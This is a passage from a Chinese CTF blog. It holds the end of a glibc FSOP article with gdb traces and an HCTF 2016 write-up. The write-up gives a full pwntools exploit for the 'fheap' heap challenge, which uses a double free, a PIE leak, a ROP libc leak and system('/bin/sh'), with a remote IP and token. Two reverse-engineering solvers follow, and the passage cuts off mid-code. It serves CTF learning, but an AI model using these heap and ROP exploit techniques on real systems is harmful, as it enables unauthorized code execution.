<pre><code>=&gt; 0xf7717dff &lt;fclose+191&gt;:     sub    edx,eax                                   
   0xf7717e01 &lt;fclose+193&gt;:     mov    ecx,ebx                                   
   0xf7717e03 &lt;fclose+195&gt;:     sub    ecx,eax                                   
   0xf7717e05 &lt;fclose+197&gt;:     cmp    edx,ecx                                   
   0xf7717e07 &lt;fclose+199&gt;:     jbe    0xf7717ee0 &lt;fclose+416&gt;                  
</code></pre><p>可以确定，这段代码直接检查了当前这个<code>FILE</code>结构体所存放的虚函数表是不是落在了libc中“默认”的IO虚函数表的范围内，显然我们的exp过不了这个检查，<br>运行到跳转处查看下结果  </p>
<pre><code>[-------------------------------------code-------------------------------------]
   0xf7717e01 &lt;fclose+193&gt;:     mov    ecx,ebx
   0xf7717e03 &lt;fclose+195&gt;:     sub    ecx,eax
   0xf7717e05 &lt;fclose+197&gt;:     cmp    edx,ecx
=&gt; 0xf7717e07 &lt;fclose+199&gt;:     jbe    0xf7717ee0 &lt;fclose+416&gt;
 | 0xf7717e0d &lt;fclose+205&gt;:     sub    esp,0x8
 | 0xf7717e10 &lt;fclose+208&gt;:     push   0x0
 | 0xf7717e12 &lt;fclose+210&gt;:     push   esi
 | 0xf7717e13 &lt;fclose+211&gt;:     call   DWORD PTR [ebx+0x8]
 |-&gt;   0xf7717ee0 &lt;fclose+416&gt;: call   0xf765ecf0
       0xf7717ee5 &lt;fclose+421&gt;: jmp    0xf7717e0d &lt;fclose+205&gt;
       0xf7717eea &lt;fclose+426&gt;: test   DWORD PTR [esi],0x8000
       0xf7717ef0 &lt;fclose+432&gt;: mov    ecx,eax
                                                                  JUMP is taken


[-------------------------------------code-------------------------------------]
   0xf7717eda &lt;fclose+410&gt;:     pop    ebp
   0xf7717edb &lt;fclose+411&gt;:     ret
   0xf7717edc &lt;fclose+412&gt;:     lea    esi,[esi+eiz*1+0x0]
=&gt; 0xf7717ee0 &lt;fclose+416&gt;:     call   0xf765ecf0
   0xf7717ee5 &lt;fclose+421&gt;:     jmp    0xf7717e0d &lt;fclose+205&gt;
   0xf7717eea &lt;fclose+426&gt;:     test   DWORD PTR [esi],0x8000
   0xf7717ef0 &lt;fclose+432&gt;:     mov    ecx,eax
   0xf7717ef2 &lt;fclose+434&gt;:     jne    0xf7717f1b &lt;fclose+475&gt;
</code></pre><p>单步运行后，标准输出输出<code>&quot;Fatal error&quot;</code>,程序接收<code>SIGABRT</code>信号后终止运行  </p>
<h2 id="猜想"><a href="#猜想" class="headerlink" title="猜想"></a>猜想</h2><p>2.24版本的libc直接检查了<code>FILE</code>结构体的虚函数表，使得FSOP这种攻击方式失去了作用，但是libc中“默认”的虚函数表是处于可读写的数据段的，<br>如果能直接改写，是否也能起到相同的作用？不过做到这一步基本离任意内存读写也不远了，应该也犯不着这么绕</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这篇文章其实当时搞完那个FSOP就想写了，结果春节期间各(da)种(you)事(xi)，愣是拖到现在，不过也总算是写下来了吧</p>
<p>参考文章：</p>
<blockquote>
<p><a href="https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/" target="_blank" rel="external">https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/</a><br><a href="http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html" target="_blank" rel="external">http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html</a></p>
</blockquote>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/glibc，pwn/">glibc，pwn</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-HCTF-2016-writeup" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/11/29/HCTF-2016-writeup/" class="article-date">
  	<time datetime="2016-11-29T11:03:47.000Z" itemprop="datePublished">2016-11-29</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/11/29/HCTF-2016-writeup/">
        HCTF-2016-writeup
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="PWN-就是干"><a href="#PWN-就是干" class="headerlink" title="PWN-就是干"></a>PWN-就是干</h2><p>程序管理如下结构体  </p>
<p><img src="./HCTF-2016-writeup/pwn.jpg" alt=""><br>如果输入的<code>content</code>长度超过15，则会另外申请一块内存存放<code>content</code>,原来<code>content</code>数组的部分会用来存放<code>content</code>指针，<br>删除结构体时存在<code>double free</code>漏洞，适当构造内存申请释放的顺序就可以构造出堆块重叠，可以修改整个<code>info</code>结构体<br>因为程序开启了PIE保护，想要利用修改结构体中的函数指针来控制<code>RIP</code>前需要先leak binary，因为函数指针原先指向<br>的是0xd6c和0xd52两个地址，PIE保护下，代码地址最后三位仍然是固定的的，所以只需要将函数指针的最低字节修改为0x2d，<br>就可以将函数指针定位到<code>0xd2d</code>这个地址，这个地址的代码是<code>call puts</code>，这样删除堆块时，<code>free(content)</code>就会变成<code>puts(content)</code>，<br>适当构造content的内容就可以将函数指针的至连带输出，进而计算出程序的基址<br>因为输入选项的时候可以在栈上填充大量的数据，因此通过修改函数指针来做ROP,用puts函数来leak libc<br>通过泄露出来的__libc_start_main函数地址在libc-database找到了对应的版本，但是其他函数的地址却和找到的版本对不上，libc-db上也找不到对应版本，<br>不过运气不错，远程的libc中的system函数偏移和在libc-database中找到的相差不远，略微调整远程就返回了<code>sh not found</code>这样的错误信息，这样就确定<code>system</code>函数地址正确<br>最后要执行<code>system(&#39;/bin/sh&#39;)</code>，原本想要往内存里写个<code>/bin/sh</code>或者把某个函数的GOT写成system，但是远程ROP执行read老是挂，无奈只好去找’/bin/sh’的地址，<br>通过system函数返回的<code>sh: XX not found</code>来确定当前地址的内容，再拿本机libc作为参照，不断微调找到正确的地址成功getshell<br>exp如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Create</span><span class="params">(p, context, length)</span>:</span></div><div class="line">    <span class="keyword">if</span> length != <span class="number">0x1000</span>:</div><div class="line">        length = length + <span class="number">1</span></div><div class="line">        context = context + <span class="string">'\x00'</span></div><div class="line">    p.recvuntil(<span class="string">'3.quit\n'</span>)</div><div class="line">    p.send(<span class="string">'create \n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Pls give string size:'</span>)</div><div class="line">    p.send(str(length) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'str:'</span>)</div><div class="line">    p.send(context)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(p, id)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'3.quit\n'</span>)</div><div class="line">    p.send(<span class="string">'delete \n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Pls give me the string id you want to delete\n'</span>)</div><div class="line">    p.send(str(id) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Are you sure?:'</span>)</div><div class="line">    p.send(<span class="string">'yes'</span>)</div><div class="line"></div><div class="line">REMOTE = <span class="keyword">True</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> REMOTE:</div><div class="line">    p = remote(<span class="string">'115.28.78.54'</span>, <span class="number">80</span>)</div><div class="line">    p.recvuntil(<span class="string">'please input you token: '</span>)</div><div class="line">    p.send(<span class="string">'HIR6yCbxwkyODNmaKToG4fANPJZnOJOBNuAf0Yio\n'</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    p = process(<span class="string">'./fheap'</span>)</div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./fheap'</span>)</div><div class="line"></div><div class="line">offset_pop4_ret = <span class="number">0x11dc</span></div><div class="line">offset_rdi_ret = <span class="number">0x11e3</span></div><div class="line">offset_mainloop = <span class="number">0xc71</span></div><div class="line">offset_rsi_r15 = <span class="number">0x11e1</span></div><div class="line"></div><div class="line">offset___libc_start_main_got = elf.got[<span class="string">'__libc_start_main'</span>]</div><div class="line">offset_atoi_got = elf.got[<span class="string">'atoi'</span>]</div><div class="line">offset_exit_got = elf.got[<span class="string">'exit'</span>]</div><div class="line">offset_puts_plt = elf.plt[<span class="string">'puts'</span>]</div><div class="line">offset_read_plt = elf.plt[<span class="string">'read'</span>]</div><div class="line"></div><div class="line"><span class="comment">#raw_input()</span></div><div class="line"></div><div class="line">Create(p, <span class="string">'A'</span> * <span class="number">0x08</span>, <span class="number">0x08</span>)</div><div class="line">Create(p, <span class="string">'B'</span> * <span class="number">0x1f</span>, <span class="number">0x1f</span>)</div><div class="line"></div><div class="line">Delete(p, <span class="number">1</span>)</div><div class="line">Delete(p, <span class="number">0</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span> * <span class="number">0x18</span> + chr(<span class="number">0x2d</span>)</div><div class="line"></div><div class="line">Create(p, payload, len(payload))</div><div class="line"></div><div class="line">Delete(p, <span class="number">1</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'A'</span> * <span class="number">0x18</span>)</div><div class="line"></div><div class="line">bin_addr = u64(p.recvuntil(<span class="string">'\n'</span>, drop = <span class="keyword">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line">bin_base = bin_addr - <span class="number">0xd2d</span></div><div class="line"></div><div class="line">pop4_ret = bin_base + offset_pop4_ret</div><div class="line">rdi_ret = bin_base + offset_rdi_ret</div><div class="line">rsi_r15_ret = bin_base + offset_rsi_r15</div><div class="line">__libc_start_main_got = bin_base + offset___libc_start_main_got</div><div class="line">atoi_got = bin_base + offset_atoi_got</div><div class="line">puts_plt = bin_base + offset_puts_plt</div><div class="line">read_plt = bin_base + offset_read_plt</div><div class="line">main_loop = bin_base + offset_mainloop</div><div class="line">exit_got = bin_base + offset_exit_got</div><div class="line"></div><div class="line">log.info(<span class="string">'fheap base: '</span> + hex(bin_base))</div><div class="line"></div><div class="line">Delete(p, <span class="number">0</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span> * <span class="number">0x18</span> + p64(pop4_ret)</div><div class="line"></div><div class="line">Create(p, payload, <span class="number">0x1000</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'delete  '</span></div><div class="line">payload += p64(<span class="number">0xdeadbeefdeadbeef</span>) * <span class="number">0x38</span></div><div class="line">payload += p64(<span class="number">0xdeadc0dedeadc0de</span>)</div><div class="line">payload += p64(rdi_ret)</div><div class="line">payload += p64(__libc_start_main_got)</div><div class="line">payload += p64(puts_plt)</div><div class="line">payload += p64(main_loop)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'3.quit\n'</span>)</div><div class="line">p.send(payload + <span class="string">'\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'Pls give me the string id you want to delete\n'</span>)</div><div class="line">p.send(str(<span class="number">1</span>) + <span class="string">'\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'Are you sure?:'</span>)</div><div class="line">p.send(<span class="string">'yes'</span>)</div><div class="line"></div><div class="line">__libc_start_main_addr = u64(p.recvuntil(<span class="string">'\n'</span>, drop = <span class="keyword">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line"></div><div class="line">log.info(<span class="string">"__libc_start_main() addr: "</span> + hex(__libc_start_main_addr))</div><div class="line"></div><div class="line">offset___libc_start_main = <span class="number">0x0000000000020740</span></div><div class="line">offset_system = <span class="number">0x0000000000045380</span></div><div class="line">offset_str_bin_sh = <span class="number">0x18c58b</span></div><div class="line"></div><div class="line">libc_base = __libc_start_main_addr - offset___libc_start_main</div><div class="line"></div><div class="line">libc_base = libc_base + <span class="number">0x10</span></div><div class="line"></div><div class="line">system_addr = libc_base + offset_system</div><div class="line">binsh_addr = libc_base + offset_str_bin_sh + <span class="number">0x3a</span> - <span class="number">0x48d</span> + <span class="number">0x40</span> - <span class="number">0x11</span></div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'delete  '</span></div><div class="line">payload += p64(<span class="number">0xdeadc0dedeadc0de</span>) * <span class="number">0x41</span></div><div class="line">payload += p64(rdi_ret)</div><div class="line">payload += p64(binsh_addr)</div><div class="line">payload += p64(system_addr)</div><div class="line">payload += p64(main_loop)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'3.quit\n'</span>)</div><div class="line">p.send(payload + <span class="string">'\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'Pls give me the string id you want to delete\n'</span>)</div><div class="line">p.send(str(<span class="number">1</span>) + <span class="string">'\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'Are you sure?:'</span>)</div><div class="line">p.send(<span class="string">'yes'</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
<h2 id="RE-前年400"><a href="#RE-前年400" class="headerlink" title="RE 前年400"></a>RE 前年400</h2><p>IDA稍微动态跟了下找到了验证函数，验证<code>if</code>里面一大串的条件，最后抠出来是一个22元一次方程组，那<code>python</code>处理下然后用<code>numpy</code>解一下，注意下浮点取整就可以了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line"></div><div class="line">f = open(<span class="string">'./list.txt'</span>)</div><div class="line">matrix = []</div><div class="line">resultlist = []</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">    content = f.readline()</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> content:</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    i = <span class="number">0</span></div><div class="line">    elementlist = []</div><div class="line">    <span class="keyword">while</span> i &lt; <span class="number">22</span>:</div><div class="line">        elementlist.append(<span class="number">0</span>)</div><div class="line">        i = i + <span class="number">1</span></div><div class="line">    result = int(content.split(<span class="string">'=='</span>)[<span class="number">1</span>])</div><div class="line">    tears = content.split(<span class="string">'=='</span>)[<span class="number">0</span>]</div><div class="line">    tmplist = &#123;&#125;</div><div class="line">    i = <span class="number">0</span></div><div class="line">    numlist = tears.split(<span class="string">' + '</span>)</div><div class="line">    <span class="keyword">while</span> i &lt; <span class="number">22</span>:</div><div class="line">        num = int(numlist[i].split(<span class="string">'*'</span>)[<span class="number">0</span>])</div><div class="line">        idx = numlist[i].split(<span class="string">'*'</span>)[<span class="number">1</span>][<span class="number">1</span>:]</div><div class="line">        i = i + <span class="number">1</span></div><div class="line">        tmplist[idx] = num</div><div class="line">    i = <span class="number">0</span></div><div class="line">    <span class="keyword">while</span> i &lt; <span class="number">22</span>:</div><div class="line">        elementlist[i] = tmplist[str(i + <span class="number">3</span>)]</div><div class="line">        i = i + <span class="number">1</span></div><div class="line">    matrix.append(elementlist)</div><div class="line">    resultlist.append(result)</div><div class="line"></div><div class="line"><span class="keyword">print</span> matrix</div><div class="line"><span class="keyword">print</span> resultlist</div><div class="line"></div><div class="line">a = np.array(matrix)</div><div class="line">b = np.array(resultlist)</div><div class="line"></div><div class="line">x = np.linalg.solve(a, b)</div><div class="line"></div><div class="line"><span class="keyword">print</span> x</div></pre></td></tr></table></figure></p>
<h2 id="RE-normal"><a href="#RE-normal" class="headerlink" title="RE normal"></a>RE normal</h2><p>程序将输入分成了几个部分来验证，每一部分验证正确后将这一部分的输入作为xor key来将下一个部分的验证代码还原出来<br>第一部分先将大括号里的前四个字符按位拆成8个字节，然后打了好长的一个表，然后做各种变换，和简单处理过的输入异或，最后和结果比对<br>把打好的表和最后的变换抠出来，拿结果异或回去就行了。。。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> v7[] =</div><div class="line">&#123;</div><div class="line">  <span class="number">0x03</span>, <span class="number">0xCC</span>, <span class="number">0x42</span>, <span class="number">0xDE</span>, <span class="number">0x2F</span>, <span class="number">0x7F</span>, <span class="number">0xF9</span>, <span class="number">0x66</span>, <span class="number">0x23</span>, <span class="number">0x01</span>, </div><div class="line">  <span class="number">0x0B</span>, <span class="number">0x31</span>, <span class="number">0x0F</span>, <span class="number">0x15</span>, <span class="number">0x5B</span>, <span class="number">0x18</span>, <span class="number">0xC5</span>, <span class="number">0xF8</span>, <span class="number">0x45</span>, <span class="number">0xF7</span>, </div><div class="line">  <span class="number">0x73</span>, <span class="number">0xE3</span>, <span class="number">0x6D</span>, <span class="number">0x32</span>, <span class="number">0xB5</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x7B</span>, <span class="number">0x07</span>, <span class="number">0xC6</span>, </div><div class="line">  <span class="number">0x78</span>, <span class="number">0xFD</span>, <span class="number">0x11</span>, <span class="number">0x19</span>, <span class="number">0x90</span>, <span class="number">0x50</span>, <span class="number">0x00</span>, <span class="number">0x3C</span>, <span class="number">0x08</span>, <span class="number">0x36</span>, </div><div class="line">  <span class="number">0xD4</span>, <span class="number">0x5F</span>, <span class="number">0x8F</span>, <span class="number">0xB1</span>, <span class="number">0x3D</span>, <span class="number">0xCD</span>, <span class="number">0xF6</span>, <span class="number">0x17</span>, <span class="number">0x9C</span>, <span class="number">0xC0</span>, </div><div class="line">  <span class="number">0xB0</span>, <span class="number">0x8D</span>, <span class="number">0x43</span>, <span class="number">0x8E</span>, <span class="number">0x63</span>, <span class="number">0x51</span>, <span class="number">0xE1</span>, <span class="number">0x68</span>, <span class="number">0x29</span>, <span class="number">0x2B</span>, </div><div class="line">  <span class="number">0xDC</span>, <span class="number">0x6B</span>, <span class="number">0xE4</span>, <span class="number">0xC2</span>, <span class="number">0x6A</span>, <span class="number">0x97</span>, <span class="number">0xB6</span>, <span class="number">0x70</span>, <span class="number">0x62</span>, <span class="number">0x3B</span>, </div><div class="line">  <span class="number">0x72</span>, <span class="number">0xEF</span>, <span class="number">0xDF</span>, <span class="number">0x7D</span>, <span class="number">0xC7</span>, <span class="number">0xA4</span>, <span class="number">0x58</span>, <span class="number">0x5A</span>, <span class="number">0xA6</span>, <span class="number">0xEA</span>, </div><div class="line">  <span class="number">0x28</span>, <span class="number">0xB2</span>, <span class="number">0x9D</span>, <span class="number">0x8A</span>, <span class="number">0x7E</span>, <span class="number">0xE7</span>, <span class="number">0x91</span>, <span class="number">0x94</span>, <span class="number">0xC3</span>, <span class="number">0xAA</span>, </div><div class="line">  <span class="number">0xD6</span>, <span class="number">0x48</span>, <span class="number">0xD2</span>, <span class="number">0x92</span>, <span class="number">0x76</span>, <span class="number">0x65</span>, <span class="number">0xD5</span>, <span class="number">0xFB</span>, <span class="number">0x14</span>, <span class="number">0xA0</span>, </div><div class="line">  <span class="number">0x0E</span>, <span class="number">0x83</span>, <span class="number">0x47</span>, <span class="number">0xA1</span>, <span class="number">0x3A</span>, <span class="number">0xF0</span>, <span class="number">0xB3</span>, <span class="number">0x09</span>, <span class="number">0x44</span>, <span class="number">0x27</span>, </div><div class="line">  <span class="number">0xB8</span>, <span class="number">0x55</span>, <span class="number">0x8C</span>, <span class="number">0xED</span>, <span class="number">0x8B</span>, <span class="number">0x0A</span>, <span class="number">0x75</span>, <span class="number">0x30</span>, <span class="number">0x38</span>, <span class="number">0x4F</span>, </div><div class="line">  <span class="number">0xC1</span>, <span class="number">0x52</span>, <span class="number">0xC8</span>, <span class="number">0xE2</span>, <span class="number">0xDA</span>, <span class="number">0xAF</span>, <span class="number">0x3E</span>, <span class="number">0x81</span>, <span class="number">0xAC</span>, <span class="number">0xA8</span>, </div><div class="line">  <span class="number">0x20</span>, <span class="number">0xBE</span>, <span class="number">0x7C</span>, <span class="number">0x9E</span>, <span class="number">0xA3</span>, <span class="number">0x7A</span>, <span class="number">0x54</span>, <span class="number">0x06</span>, <span class="number">0x1C</span>, <span class="number">0x99</span>, </div><div class="line">  <span class="number">0xE5</span>, <span class="number">0x49</span>, <span class="number">0x33</span>, <span class="number">0xBD</span>, <span class="number">0x9F</span>, <span class="number">0xD8</span>, <span class="number">0xE0</span>, <span class="number">0x41</span>, <span class="number">0xA5</span>, <span class="number">0x2C</span>, </div><div class="line">  <span class="number">0x05</span>, <span class="number">0xF4</span>, <span class="number">0x35</span>, <span class="number">0x2D</span>, <span class="number">0x89</span>, <span class="number">0x10</span>, <span class="number">0xDB</span>, <span class="number">0x0C</span>, <span class="number">0xAD</span>, <span class="number">0x93</span>, </div><div class="line">  <span class="number">0xEB</span>, <span class="number">0xBC</span>, <span class="number">0x5E</span>, <span class="number">0xFF</span>, <span class="number">0x6F</span>, <span class="number">0xE8</span>, <span class="number">0xC9</span>, <span class="number">0x13</span>, <span class="number">0x82</span>, <span class="number">0x77</span>, </div><div class="line">  <span class="number">0x96</span>, <span class="number">0x3F</span>, <span class="number">0x4C</span>, <span class="number">0xBA</span>, <span class="number">0xB4</span>, <span class="number">0xA2</span>, <span class="number">0xCE</span>, <span class="number">0xDD</span>, <span class="number">0x04</span>, <span class="number">0x4B</span>, </div><div class="line">  <span class="number">0x39</span>, <span class="number">0x2A</span>, <span class="number">0x46</span>, <span class="number">0xCA</span>, <span class="number">0x85</span>, <span class="number">0xFC</span>, <span class="number">0x25</span>, <span class="number">0xA7</span>, <span class="number">0x24</span>, <span class="number">0x57</span>, </div><div class="line">  <span class="number">0x1E</span>, <span class="number">0x1D</span>, <span class="number">0x4A</span>, <span class="number">0x87</span>, <span class="number">0xFA</span>, <span class="number">0x26</span>, <span class="number">0xF5</span>, <span class="number">0x0D</span>, <span class="number">0x12</span>, <span class="number">0x1B</span>, </div><div class="line">  <span class="number">0xAE</span>, <span class="number">0x79</span>, <span class="number">0x67</span>, <span class="number">0xBB</span>, <span class="number">0x21</span>, <span class="number">0x69</span>, <span class="number">0x74</span>, <span class="number">0x84</span>, <span class="number">0x22</span>, <span class="number">0x5C</span>, </div><div class="line">  <span class="number">0x5D</span>, <span class="number">0xEC</span>, <span class="number">0xEE</span>, <span class="number">0x1F</span>, <span class="number">0x37</span>, <span class="number">0xE9</span>, <span class="number">0xF2</span>, <span class="number">0x40</span>, <span class="number">0x86</span>, <span class="number">0xD7</span>, </div><div class="line">  <span class="number">0xF1</span>, <span class="number">0xA9</span>, <span class="number">0xAB</span>, <span class="number">0xD0</span>, <span class="number">0x98</span>, <span class="number">0x64</span>, <span class="number">0xF3</span>, <span class="number">0x9A</span>, <span class="number">0x9B</span>, <span class="number">0x71</span>, </div><div class="line">  <span class="number">0x4D</span>, <span class="number">0x4E</span>, <span class="number">0xB7</span>, <span class="number">0x60</span>, <span class="number">0x95</span>, <span class="number">0xCB</span>, <span class="number">0x02</span>, <span class="number">0x59</span>, <span class="number">0xBF</span>, <span class="number">0xB9</span>, </div><div class="line">  <span class="number">0x88</span>, <span class="number">0xC4</span>, <span class="number">0xCF</span>, <span class="number">0x16</span>, <span class="number">0xD3</span>, <span class="number">0xD1</span>, <span class="number">0xD9</span>, <span class="number">0x80</span>, <span class="number">0x1A</span>, <span class="number">0xFE</span>, </div><div class="line">  <span class="number">0x2E</span>, <span class="number">0x6E</span>, <span class="number">0x56</span>, <span class="number">0x34</span>, <span class="number">0x53</span>, <span class="number">0xE6</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, </div><div class="line">  <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </div><div class="line">  <span class="number">0x00</span>, <span class="number">0x00</span></div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> i, j;</div><div class="line">    i = <span class="number">0</span>;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> v4, v21, v17, v16;</div><div class="line">    v4 = <span class="number">0</span>;</div><div class="line">    v21 = <span class="number">0</span>;</div><div class="line">    v17 = <span class="number">0</span>;</div><div class="line">    v16 = <span class="number">0</span>;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> v8[<span class="number">0x08</span>] = <span class="string">"]\t\x90\x90&amp;/\x01\x8a"</span>;</div><div class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">8</span>; ++j )</div><div class="line">    &#123;</div><div class="line">        i = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">signed</span> <span class="keyword">int</span>)(i + <span class="number">1</span>) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>) + i + <span class="number">1</span>)</div><div class="line">        - ((<span 